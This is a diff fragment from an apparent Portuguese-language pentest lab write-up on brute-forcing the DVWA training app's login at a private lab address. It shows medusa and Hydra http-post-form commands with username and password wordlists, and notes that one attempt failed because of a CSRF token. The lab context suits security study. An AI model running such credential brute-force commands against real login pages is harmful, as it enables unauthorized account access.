@@ -79,7 +79,7 @@ medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M http \
 **Resultado:** Falha. Possível causa: token CSRF dinâmico na página de login.
 
 #### Ataque com Hydra
-Comando alternativo recomendado:
+Comando alternativo utilizado:
 ```bash
 hydra -L usuarios.txt -P senhas.txt 192.168.56.101 http-post-form \
 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6
